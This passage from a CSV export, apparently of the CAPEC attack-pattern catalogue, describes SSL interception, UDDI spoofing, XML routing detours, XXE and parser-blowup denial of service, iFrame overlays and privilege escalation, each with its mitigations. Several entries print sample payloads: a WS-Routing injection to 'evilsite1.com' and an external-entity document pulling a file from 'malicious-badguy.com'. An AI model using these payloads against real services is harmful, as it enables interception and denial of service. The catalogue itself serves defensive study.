used.::STEP:2:PHASE:Experiment:DESCRIPTION:[Intercept Communication] Provide controlled access to the server by the client, by either providing a link for the client to click on, or by positioning one's self at a place on the network to intercept and control the flow of data between client and server, e.g. AiTM (adversary in the middle - CAPEC-94).:TECHNIQUE:Create a malicious webpage that looks identical to the target webpage, but routes client traffic to the server such that the adversary can observe the traffic and perform an adverary in the middle attack.:TECHNIQUE:If the adversary has access to the network that either the client or server is on, the can attempt to use a packet sniffer to perform an adversary in the middle attack.:TECHNIQUE:Install a packet sniffer through malware directly to a client device that can intercept SSL/TLS traffic and perform an adversary in the middle attack.::STEP:3:PHASE:Exploit:DESCRIPTION:[Capture or Manipulate Sensitive Data] Once the adversary has the ability to intercept the secure communication, they exploit the incorrectly configured SSL to view the encrypted communication. The adversary can choose to just record the secure communication or manipulate the data to achieve a desired effect.:TECHNIQUE:Use known exploits for old SSL and TLS versions.:TECHNIQUE:Use known exploits for weak ciphers such as DES and RC4.::\",\"::Access to the client/server stream.::\",\"::SKILL:The adversary needs real-time access to network traffic in such a manner that the adversary can grab needed information from the SSL stream, possibly influence the decided-upon encryption method and options, and perform automated analysis to decipher encrypted material recovered. Tools exist to automate part of the tasks, but to successfully use these tools in an attack scenario requires detailed understanding of the underlying principles.:LEVEL:High::\",\"::The adversary needs the ability to sniff traffic, and optionally be able to route said traffic to a system where the sniffing of traffic can take place, and act upon the recovered traffic in real time.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Do not use SSL, as all SSL versions have been broken and should not be used. If TLS is not an option for the client or server, consider setting timeouts on SSL sessions to extremely low values to lessen the potential impact.::Only use TLS version 1.2+, as versions 1.0 and 1.1 are insecure.::Configure TLS to use secure algorithms. The current recommendation is to use ECDH, ECDSA, AES256-GCM, and SHA384 for the most security.::\",\"::Using MITM techniques, an adversary launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the adversary to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.::\",\"::201::\",\"\",\"\",\n218,\"Spoofing of UDDI/ebXML Messages\",Detailed,Draft,\"An attacker spoofs a UDDI, ebXML, or similar message in order to impersonate a service provider in an e-business transaction. UDDI, ebXML, and similar standards are used to identify businesses in e-business transactions. Among other things, they identify a particular participant, WSDL information for SOAP transactions, and supported communication protocols, including security protocols. By spoofing one of these messages an attacker could impersonate a legitimate business in a transaction or could manipulate the protocols used between a client and business. This could result in disclosure of sensitive information, loss of message integrity, or even financial fraud.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:148::\",\"\",\"::The targeted business's UDDI or ebXML information must be served from a location that the attacker can spoof or compromise or the attacker must be able to intercept and modify unsecured UDDI/ebXML messages in transit.::\",\"\",\"::The attacker must be able to force the target user to accept their spoofed UDDI or ebXML message as opposed to the a message associated with a legitimate company. Depending on the follow-on for the attack, the attacker may also need to serve its own web services.::\",\"\",\"\",\"::Implementation: Clients should only trust UDDI, ebXML, or similar messages that are verifiably signed by a trusted party.::\",\"\",\"::345::\",\"\",\"\",\n219,\"XML Routing Detour Attacks\",Standard,Draft,\"An attacker subverts an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. XML Routing Detour Attacks are Adversary in the Middle type attacks (CAPEC-94). The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of their choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information.\",\"\",High,Medium,\"::NATURE:ChildOf:CAPEC ID:94::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using command line or an automated tool, an attacker records all instances of web services to process XML requests.:TECHNIQUE:Use automated tool to record all instances to process XML requests or find exposed WSDL.:TECHNIQUE:Use tools to crawl WSDL::STEP:2:PHASE:Experiment:DESCRIPTION:[Identify SOAP messages that have multiple state processing.] Inspect instance to see whether the XML processing has multiple stages or not.:TECHNIQUE:Inspect the SOAP message routing head to see whether the XML processing has multiple stages or not.::STEP:3:PHASE:Exploit:DESCRIPTION:[Launch an XML routing detour attack] The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message identified in the Explore phase. Thus, the attacker can route the XML message to the attacker controlled node (and access the message contents).:TECHNIQUE:The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message::\",\"::The targeted system must have multiple stages processing of XML content.::\",\"::SKILL:To inject a bogus node in the XML routing table:LEVEL:Low::\",\"::The attacker must be able to insert or compromise a system into the processing path for the transaction.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Design: Specify maximum number intermediate nodes for the request and require SSL connections with mutual authentication.::Implementation: Use SSL for connections between all parties with mutual authentication.::\",\"::Here is an example SOAP call from a client, example1.com, to a target, example4.com, via 2 intermediaries, example2.com and example3.com. (note: The client here is not necessarily a 'end user client' but rather the starting point of the XML transaction). Example SOAP message with routing information in header: <S:Envelope><S:Header><m:path xmlns:m=http://schemas.example.com/rp/ S:actor=http://schemas.example.com/soap/actor S:mustUnderstand=1><m:action>http://example1.com/</m:action> <m:to>http://example4.com/router</m:to> <m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id> <m:fwd> <m:via>http://example2.com/router</m:via> </m:fwd> <m:rev /></m:path></S:Header> <S:Body>...</S:Body></S:Envelope> Add an additional node (example3.com/router) to the XML path in a WS-Referral message <r:ref xmlns:r=http://schemas.example.com/referral><r:for><r:prefix>http://example2.com/router</r:prefix></r:for> <r:if/> <r:go><r:via>http://example3.com/router</r:via></r:go></r:ref> Resulting in the following SOAP Header: <S:Envelope><S:Header><m:path xmlns:m=http://schemas.example.com/rp/ S:actor=http://schemas.example.com/soap/actor S:mustUnderstand=1><m:action>http://example1.com/</m:action> <m:to>http://example4.com/router</m:to> <m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id> <m:fwd><m:via>http://example2.com/router</m:via> <m:via>http://example3.com/router</m:via></m:fwd> <m:rev /></m:path></S:Header> <S:Body>...</S:Body></S:Envelope> Continuing with this example, the attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header but not access the message directly on the initiator/intermediary node that they have targeted. Example of WS-Referral based WS-Routing injection of the bogus node route: <r:ref xmlns:r=http://schemas.example.com/referral><r:for><r:prefix>http://example2.com/router</r:prefix></r:for> <r:if/> <r:go><r:via>http://evilsite1.com/router</r:via></r:go></r:ref> Resulting XML Routing Detour attack: <S:Envelope><S:Header><m:path xmlns:m=http://schemas.example.com/rp/ S:actor=http://schemas.example.com/soap/actor S:mustUnderstand=1><m:action>http://example_0.com/</m:action> <m:to>http://example_4.com/router</m:to> <m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id> <m:fwd><m:via>http://example2.com/router</m:via> <m:via>http://evilesite1.com/router</m:via> <m:via>http://example3.com/router</m:via></m:fwd> <m:rev /></m:path></S:Header> <S:Body>...</S:Body></S:Envelope> Thus, the attacker can route the XML message to the attacker controlled node (and access to the message contents).::\",\"::441::610::\",\"TAXONOMY NAME:WASC:ENTRY ID:32:ENTRY NAME:Routing Detour::::TAXONOMY NAME:WASC:ENTRY ID:44:ENTRY NAME:XML Entity Expansion::\",\"\",\n22,\"Exploiting Trust in Client\",Meta,Draft,\"An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by communicating directly with the server where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.\",\"\",High,High,\"\",\"\",\"::Server software must rely on client side formatted and validated values, and not reinforce these checks on the server side.::\",\"::SKILL:The attacker must have fairly detailed knowledge of the syntax and semantics of client/server communications protocols and grammars:LEVEL:Medium::\",\"::Ability to communicate synchronously or asynchronously with server::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.::Design: Do not rely on client validation or encoding for security purposes.::Design: Utilize digital signatures to increase authentication assurance.::Design: Utilize two factor authentication to increase authentication assurance.::Implementation: Perform input validation for all remote content.::\",\"::Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.::Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.::Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.::Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on.::\",\"::290::287::20::200::693::\",\"\",\"\",\n220,\"Client-Server Protocol Manipulation\",Standard,Draft,\"An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:272::\",\"\",\"::The client and/or server must utilize a protocol that has a weakness allowing manipulation of the interaction.::\",\"\",\"::The adversary must be able to identify the weakness in the utilized protocol and exploit it. This may require a sniffing tool as well as packet creation abilities. The adversary will be aided if they can force the client and/or server to utilize a specific protocol known to contain exploitable weaknesses.::\",\"\",\"\",\"\",\"\",\"::757::\",\"\",\"\",\n221,\"Data Serialization External Entities Blowup\",Detailed,Draft,\"This attack takes advantage of the entity replacement property of certain data serialization languages (e.g., XML, YAML, etc.) where the value of the replacement is a URI. A well-crafted file could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:231::NATURE:ChildOf:CAPEC ID:278::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find target web service] The adversary must first find a web service that takes input data in the form of a serialized language such as XML or YAML.::STEP:2:PHASE:Experiment:DESCRIPTION:[Host malicious file on a server] The adversary will create a web server that contains a malicious file. This file will be extremely large, so that if a web service were to try to load it, the service would most likely hang.::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft malicious data] Using the serialization language that the web service takes as input, the adversary will craft data that links to the malicious file using an external entity reference to the URL of the file.::STEP:4:PHASE:Exploit:DESCRIPTION:[Send serialized data containing URI] The adversary will send specially crafted serialized data to the web service. When the web service loads the input, it will attempt to download the malicious file. Depending on the amount of memory the web service has, this could either crash the service or cause it to hang, resulting in a Denial of Service attack.::\",\"::A server that has an implementation that accepts entities containing URI values.::\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.::This attack may be mitigated by tweaking the serialized data parser to not resolve external entities. If external entities are needed, then implement a custom resolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.::\",\"::In this example, the XML parser parses the attacker's XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer. <?xml version=1.0?>< !DOCTYPE bomb [<!ENTITY detonate SYSTEM http://www.malicious-badguy.com/myhugefile.exe>]><bomb>&detonate;</bomb>::\",\"::611::\",\"TAXONOMY NAME:WASC:ENTRY ID:43:ENTRY NAME:XML External Entities::\",\"\",\n222,\"iFrame Overlay\",Detailed,Draft,\"In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:103::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Craft an iFrame Overlay page] The adversary crafts a malicious iFrame overlay page.:TECHNIQUE:The adversary leverages iFrame overlay capabilities to craft a malicious iFrame overlay page.::STEP:2:PHASE:Exploit:DESCRIPTION:[adversary tricks victim to load the iFrame overlay page] adversary utilizes some form of temptation, misdirection or coercion to trick the victim to loading and interacting with the iFrame overlay page in a way that increases the chances that the victim will visit the malicious page.:TECHNIQUE:Trick the victim to the malicious site by sending the victim an e-mail with a URL to the site.:TECHNIQUE:Trick the victim to the malicious site by manipulating URLs on a site trusted by the victim.:TECHNIQUE:Trick the victim to the malicious site through a cross-site scripting attack.::STEP:3:PHASE:Exploit:DESCRIPTION:[Trick victim into interacting with the iFrame overlay page in the desired manner] The adversary tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.:TECHNIQUE:Hide action controls over very commonly used functionality.:TECHNIQUE:Hide action controls over very psychologically tempting content.::\",\"::The victim is communicating with the target application via a web based UI and not a thick client. The victim's browser security policies allow iFrames. The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser). The victim has an active session with the target system. The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system.::\",\"::SKILL:Crafting the proper malicious site and luring the victim to this site is not a trivial task.:LEVEL:High::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Configuration: Disable iFrames in the Web browser.::Operation: When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.::Operation: If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.::\",\"::The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled Don't Click. This button is aligned with the invisible Update button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to their Twitter profile.::\",\"::1021::\",\"\",\"\",\n224,\"Fingerprinting\",Meta,Stable,\"An adversary compares output from a target system to known indicators that uniquely identify specific details about the target. Most commonly, fingerprinting is done to determine operating system and application versions. Fingerprinting can be done passively as well as actively. Fingerprinting by itself is not usually detrimental to the target. However, the information gathered through fingerprinting often enables an adversary to discover existing weaknesses in the target.\",\"\",High,Very Low,\"\",\"\",\"::A means by which to interact with the target system directly.::\",\"::SKILL:Some fingerprinting activity requires very specific knowledge of how different operating systems respond to various TCP/IP requests. Application fingerprinting can be as easy as envoking the application with the correct command line argument, or mouse clicking in the appropriate place on the screen.:LEVEL:Medium::\",\"::If on a network, the adversary needs a tool capable of viewing network communications at the packet level and with header information, like Mitmproxy, Wireshark, or Fiddler.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::While some information is shared by systems automatically based on standards and protocols, remove potentially sensitive information that is not necessary for the application's functionality as much as possible.::\",\"\",\"::200::\",\"TAXONOMY NAME:WASC:ENTRY ID:45:ENTRY NAME:Fingerprinting::\",\"\",\n226,\"Session Credential Falsification through Manipulation\",Detailed,Draft,\"An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:196::\",\"\",\"::The targeted application must use session credentials to identify legitimate users.::\",\"\",\"::An attacker will need tools to sniff existing credentials (possibly their own) in order to retrieve a base credential for modification. They will need to understand how the components of the credential affect server behavior and how to manipulate this behavior by changing the credential. Finally, they will need tools to allow them to craft and transmit a modified credential.::\",\"\",\"\",\"\",\"\",\"::565::472::\",\"\",\"\",\n227,\"Sustained Client Engagement\",Meta,Draft,\"An adversary attempts to deny legitimate users access to a resource by continually engaging a specific resource in an attempt to keep the resource tied up as long as possible. The adversary's primary goal is not to crash or flood the target, which would alert defenders; rather it is to repeatedly perform actions or abuse algorithmic flaws such that a given resource is tied up and not available to a legitimate user. By carefully crafting a requests that keep the resource engaged through what is seemingly benign requests, legitimate users are limited or completely denied access to the resource.\",\"\",,,\"\",\"\",\"::This pattern of attack requires a temporal aspect to the servicing of a given request. Success can be achieved if the adversary can make requests that collectively take more time to complete than legitimate user requests within the same time frame.::\",\"\",\"::To successfully execute this pattern of attack, a script or program is often required that is capable of continually engaging the target and maintaining sustained usage of a specific resource. Depending on the configuration of the target, it may or may not be necessary to involve a network or cluster of objects all capable of making parallel requests.::\",\"\",\"\",\"::Potential mitigations include requiring a unique login for each resource request, constraining local unprivileged access by disallowing simultaneous engagements of the resource, or limiting access to the resource to one access per IP address. In such scenarios, the adversary would have to increase engagements either by launching multiple sessions manually or programmatically to counter such defenses.::\",\"\",\"::400::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499:ENTRY NAME:Endpoint Denial of Service::::TAXONOMY NAME:WASC:ENTRY ID:10:ENTRY NAME:Denial of Service::\",\"\",\n228,\"DTD Injection\",Detailed,Draft,\"An attacker injects malicious content into an application's DTD in an attempt to produce a negative technical impact. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:250::NATURE:CanPrecede:CAPEC ID:197::NATURE:CanPrecede:CAPEC ID:491::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.:TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine use of XML with DTDs] Examine application input to identify XML input that leverage the use of one or more DTDs.:TECHNIQUE:Examine any available documentation for the application that discusses expected XML input.:TECHNIQUE:Exercise the application using XML input with and without a DTD specified. Failure without DTD likely indicates use of DTD.::STEP:3:PHASE:Exploit:DESCRIPTION:[Craft and inject XML containg malicious DTD payload]:TECHNIQUE:Inject XML expansion attack that creates a Denial of Service impact on the targeted server using its DTD.:TECHNIQUE:Inject XML External Entity (XEE) attack that can cause the disclosure of confidential information, execute abitrary code, create a Denial of Service of the targeted server, or several other malicious impacts.::\",\"::The target must be running an XML based application that leverages DTDs.::\",\"\",\"\",\"\",\"\",\"::Design: Sanitize incoming DTDs to prevent excessive expansion or other actions that could result in impacts like resource depletion.::Implementation: Disallow the inclusion of DTDs as part of incoming messages.::Implementation: Use XML parsing tools that protect against DTD attacks.::\",\"\",\"::829::\",\"\",\"\",\n229,\"Serialized Data Parameter Blowup\",Detailed,Draft,\"This attack exploits certain serialized data parsers (e.g., XML, YAML, etc.) which manage data in an inefficient manner. The attacker crafts an serialized data file with multiple configuration parameters in the same dataset. In a vulnerable parser, this results in a denial of service condition where CPU resources are exhausted because of the parsing algorithm. The weakness being exploited is tied to parser implementation and not language specific.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:231::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process requests using serialized data.:TECHNIQUE:Use an automated tool to record all instances of URLs to process requests from serialized data.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes requests using serialized data.::STEP:2:PHASE:Exploit:DESCRIPTION:[Launch a Blowup attack] The attacker crafts malicious messages that contain multiple configuration parameters in the same dataset.:TECHNIQUE:Send the malicious crafted message containing the multiple configuration parameters to the target URL, causing a denial of service.::\",\"::The server accepts input in the form of serialized data and is using a parser with a runtime longer than O(n) for the insertion of a new configuration parameter in the data container.(examples are .NET framework 1.0 and 1.1)::\",\"\",\"\",\"\",\"\",\"::This attack may be mitigated completely by using a parser that is not using a vulnerable container.::Mitigation may limit the number of configuration parameters per dataset.::\",\"::In this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2). <?xml version=1.0?><fooaaa=ZZZ=...999=/> A document with n attributes results in (n^2)/2 operations to be performed. If an operation takes 100 nanoseconds then a document with 100,000 operations would take 500s to process. In this fashion a small message of less than 1MB causes a denial of service condition on the CPU resources.::A YAML bomb leverages references within a YAML file to create exponential growth in memory requirements. By creating a chain of keys whose values are a list of multiple references to the next key in the chain, the amount of memory and processing required to handle the data grows exponentially. This may lead to denial of service or instability resulting from excessive resource consumption.::\",\"::770::\",\"TAXONOMY NAME:WASC:ENTRY ID:41:ENTRY NAME:XML Attribute Blowup::\",\"\",\n23,\"File Content Injection\",Standard,Draft,\"An adversary poisons files with a malicious payload (targeting the file systems accessible by the target software), which may be passed through by standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes, in order to exploit the host's trust in executing remote content, including binary files.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:242::NATURE:CanAlsoBe:CAPEC ID:165::\",\"\",\"::The target software must consume files.::The adversary must have access to modify files that the target software will consume.::\",\"::SKILL:How to poison a file with malicious payload that will exploit a vulnerability when the file is opened. The adversary must also know how to place the file onto a system where it will be opened by an unsuspecting party, or force the file to be opened.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Design: Enforce principle of least privilege::Design: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)::Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.::Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.::Implementation: Virus scanning on host::Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.::\",\"::PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs.::\",\"::20::\",\"\",\"\",\n230,\"Serialized Data with Nested Payloads\",Standard,Draft,\"Applications often need to transform data in and out of a data format (e.g., XML and YAML) by using a parser. It may be possible for an adversary to inject data that may have an adverse effect on the parser when it is being processed. Many data format languages allow the definition of macro-like structures that can be used to simplify the creation of complex structures. By nesting these structures, causing the data to be repeatedly substituted, an adversary can cause the parser to consume more resources while processing, causing excessive memory consumption and CPU utilization.\",\"::TERM:XML Denial of Service (XML DoS):DESCRIPTION:::\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:130::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:An adversary determines the input data stream that is being processed by a data parser that supports using substitution on the victim's side.::STEP:2:PHASE:Exploit:DESCRIPTION:An adversary crafts input data that may have an adverse effect on the operation of the parser when the data is parsed on the victim's system.::\",\"::An application's user-controllable data is expressed in a language that supports subsitution.::An application does not perform sufficient validation to ensure that user-controllable data is not malicious.::\",\"\",\"\",\"::Bad data is passed to the data parser (possibly repeatedly), possibly making it crash or execute arbitrary code.::\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Carefully validate and sanitize all user-controllable data prior to passing it to the data parser routine. Ensure that the resultant data is safe to pass to the data parser.::Perform validation on canonical data.::Pick a robust implementation of the data parser.::\",\"\",\"::112::20::674::770::\",\"\",\"\",\n231,\"Oversized Serialized Data Payloads\",Standard,Draft,\"An adversary injects oversized serialized data payloads into a parser during data processing to produce adverse effects upon the parser such as exhausting system resources and arbitrary code execution.\",\"::TERM:XML Denial of Service (XML DoS):DESCRIPTION:::\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:130::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:An adversary determines the input data stream that is being processed by an serialized data parser on the victim's side.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary crafts input data that may have an adverse effect on the operation of the data parser when the data is parsed on the victim's system.::\",\"::An application uses an parser for serialized data to perform transformation on user-controllable data.::An application does not perform sufficient validation to ensure that user-controllable data is safe for a data parser.::\",\"::SKILL:Denial of service:LEVEL:Low::SKILL:Arbitrary code execution:LEVEL:High::\",\"\",\"::Bad data is passed to the serialized data parser (possibly repeatedly), possibly making it crash or execute arbitrary code.::\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Carefully validate and sanitize all user-controllable serialized data prior to passing it to the parser routine. Ensure that the resultant data is safe to pass to the parser.::Perform validation on canonical data.::Pick a robust implementation of the serialized data parser.::Validate data against a valid schema or DTD prior to parsing.::\",\"\",\"::112::20::674::770::\",\"\",\"TYPE:Other:NOTE:In many cases this type of an attack will result in an XML Denial of Service (XDoS) or similar Denial of Service (DoS) due to an application becoming unstable, freezing, or crashing. However it is possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [REF-89].::::TYPE:Other:NOTE:The main weakness in serialized data related DoS is that the service provider generally must inspect, parse, and validate the data messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that DoS targets.::\",\n233,\"Privilege Escalation\",Meta,Draft,\"An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.\",\"\",,,\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"::269::1264::1311::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1548:ENTRY NAME:Abuse Elevation Control Mechanism::\",\"\",\n234,\"Hijacking a privileged process\",Standard,Draft,\"An adversary gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of privilege in order to execute their own code.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:233::NATURE:CanFollow:CAPEC ID:242::NATURE:CanFollow:CAPEC ID:175::NATURE:CanFollow:CAPEC ID:100::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find process with elevated priveleges] The adversary probes for processes running with elevated privileges.:TECHNIQUE:On Windows, use the process explorer's security tab to see if a process is running with administror privileges.:TECHNIQUE:On Linux, use the ps command to view running processes and pipe the output to a search for a particular user, or the root user.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find vulnerability in running process] The adversary looks for a vulnerability in the running process that would allow for arbitrary code execution with the privilege of the running process.:TECHNIQUE:Look for improper input validation:TECHNIQUE:Look for a buffer overflow which may be exploited if an adversary can inject unvalidated data.:TECHNIQUE:Utilize system utilities that support process control that have been inadequately secured::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute arbitrary code] The adversary exploits the vulnerability that they have found and hijacks the running process.::\",\"::The targeted process or operating system must contain a bug that allows attackers to hijack the targeted process.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"\",\"\",\"::732::648::\",\"\",\"\",\n237,\"Escaping a Sandbox by Calling Code in Another Language\",Detailed,Draft,\"The attacker may submit malicious code of another 